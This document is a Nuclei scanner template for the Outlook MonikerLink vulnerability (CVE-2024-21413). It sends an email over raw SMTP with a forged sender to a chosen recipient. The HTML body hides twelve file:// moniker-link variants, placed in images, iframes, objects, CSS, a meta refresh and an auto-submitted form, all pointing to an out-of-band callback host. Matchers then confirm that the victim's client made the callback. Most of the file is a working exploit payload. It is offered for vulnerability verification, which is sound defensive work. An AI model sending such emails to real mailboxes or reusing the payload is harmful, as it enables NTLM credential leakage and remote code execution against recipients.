id: cve-2024-21413
info:
  name: Microsoft Outlook MonikerLink RCE
  author: six
  severity: critical
  description: |
    CVE-2024-21413 is a critical vulnerability affecting Microsoft Outlook, known as the "MonikerLink" bug.
    This flaw allows attackers to bypass Outlook's Protected View and execute arbitrary code on a victim's
    system without any user interaction. By exploiting specially crafted hyperlinks, attackers can trigger
    the vulnerability, leading to potential credential theft and remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-21413
    - https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/
    - https://www.bleepingcomputer.com/news/security/new-critical-microsoft-outlook-rce-bug-is-trivial-to-exploit/
  classification:
    cve-id: CVE-2024-21413
    cwe-id: CWE-20
  metadata:
    vendor: Microsoft
    product: Outlook
    oob: interactsh
    variants: 12
    verified: true
  tags: cve, outlook, rce, moniker, smtp

variables:
  send_to: "{{send_to}}"
  
  username: "{{to_lower(rand_text_alphanumeric(6))}}"
  domain: "{{send_to | split('@')[1]}}"
  send_from: "{{username}}@{{domain}}"
  
  tok_img: "{{rand_text_alpha(6)}}"
  tok_css: "{{rand_text_alpha(6)}}"
  tok_obj: "{{rand_text_alpha(6)}}"
  tok_pref: "{{rand_text_alpha(6)}}"
  tok_vid: "{{rand_text_alpha(6)}}"
  tok_aud: "{{rand_text_alpha(6)}}"
  tok_meta: "{{rand_text_alpha(6)}}"
  tok_iframe: "{{rand_text_alpha(6)}}"
  tok_embed: "{{rand_text_alpha(6)}}"
  tok_source: "{{rand_text_alpha(6)}}"
  tok_form: "{{rand_text_alpha(6)}}"
  tok_base: "{{rand_text_alpha(6)}}"
  
  subj_tok: "{{rand_text_alpha(8)}}"
  item_tok: "{{rand_text_alpha(4)}}"
  boundary: "{{rand_text_alphanumeric(14)}}"
  message_id: "{{rand_text_alphanumeric(16)}}"

network:
  - host:
      - "{{Hostname}}"
    port: 25 #"{{Port}}"
    inputs:
      - data: |
          EHLO nuclei.local\r
      - data: |
          MAIL FROM:<{{send_from}}>\r
      - data: |
          RCPT TO:<{{send_to}}>\r
      - data: |
          DATA\r
      - data: |
          Date: {{date_time("%a, %d %b %Y %H:%M:%S %z")}}\r
          Message-ID: <{{message_id}}@nuclei.local>\r
          Subject: [{{subj_tok}}] Document Review\r
          From: {{send_from}}\r
          To: {{send_to}}\r
          MIME-Version: 1.0\r
          Content-Type: multipart/alternative; boundary="=={{boundary}}=="\r
          \r
          --=={{boundary}}==\r
          Content-Type: text/plain; charset=UTF-8\r
          \r
          Please review the document.\r
          \r
          --=={{boundary}}==\r
          Content-Type: text/html; charset=UTF-8\r
          \r
          <!DOCTYPE html>\r
          <html>\r
          <head>\r
            <title>Document</title>\r
            <meta http-equiv="refresh" content="0;url=file://{{interactsh-url}}/meta-{{tok_meta}}/doc.txt!{{item_tok}}">\r
            <base href="file://{{interactsh-url}}/base-{{tok_base}}/doc.txt!{{item_tok}}">\r
            <link rel="prefetch" href="file://{{interactsh-url}}/pref-{{tok_pref}}/doc.txt!{{item_tok}}">\r
            <style>.bg{background-image:url('file://{{interactsh-url}}/css-{{tok_css}}/doc.txt!{{item_tok}}');width:1px;height:1px;position:absolute;left:-9999px;}.h{display:none;}</style>\r
          </head>\r
          <body>\r
            <img src="file://{{interactsh-url}}/img-{{tok_img}}/doc.txt!{{item_tok}}" class="h" alt="">\r
            <div class="bg"></div>\r
            <object data="file://{{interactsh-url}}/obj-{{tok_obj}}/doc.txt!{{item_tok}}" style="width:0;height:0;position:absolute;left:-9999px;"></object>\r
            <iframe src="file://{{interactsh-url}}/iframe-{{tok_iframe}}/doc.txt!{{item_tok}}" style="width:0;height:0;position:absolute;left:-9999px;"></iframe>\r
            <embed src="file://{{interactsh-url}}/embed-{{tok_embed}}/doc.txt!{{item_tok}}" style="width:0;height:0;position:absolute;left:-9999px;">\r
            <video poster="file://{{interactsh-url}}/vid-{{tok_vid}}/doc.txt!{{item_tok}}" class="h"><source src="file://{{interactsh-url}}/source-{{tok_source}}/doc.txt!{{item_tok}}"></video>\r
            <audio preload="auto" src="file://{{interactsh-url}}/aud-{{tok_aud}}/doc.txt!{{item_tok}}" class="h"></audio>\r
            <form action="file://{{interactsh-url}}/form-{{tok_form}}/doc.txt!{{item_tok}}" method="post" style="display:none;" id="f"><input type="submit" id="s"></form>\r
            <script>setTimeout(function(){try{document.getElementById('s').click();}catch(e){}},100);</script>\r
          </body>\r
          </html>\r
          \r
          --=={{boundary}}==--\r
          \r
          .\r
      - data: |
          QUIT\r
    matchers-condition: and
    matchers:
      - type: word
        part: raw
        words:
          - "250 2.0.0"
          - "250 2.1.0"  
          - "250 2.1.5"
          - "250 OK"
          - "250 Queued"
          - "250 Message accepted"
          - "250 Delivered"
          - "250 Accepted"
          - "250-"
        condition: or
      - type: word
        part: raw
        words:
          - "4"
          - "5"
        negative: true
      - type: dsl
        dsl:
          - (interactsh_protocol == "dns" || interactsh_protocol == "http")
          - |
            contains(interactsh_request, "img-") ||
            contains(interactsh_request, "css-") ||
            contains(interactsh_request, "obj-") ||
            contains(interactsh_request, "pref-") ||
            contains(interactsh_request, "vid-") ||
            contains(interactsh_request, "aud-") ||
            contains(interactsh_request, "meta-") ||
            contains(interactsh_request, "iframe-") ||
            contains(interactsh_request, "embed-") ||
            contains(interactsh_request, "source-") ||
            contains(interactsh_request, "form-") ||
            contains(interactsh_request, "base-")
        condition: and
    extractors:
      - type: dsl
        name: oob_protocol
        dsl:
          - interactsh_protocol
      - type: regex
        name: variant_triggered
        part: interactsh_request
        regex:
          - "(img|css|obj|pref|vid|aud|meta|iframe|embed|source|form|base)-[a-zA-Z]+"
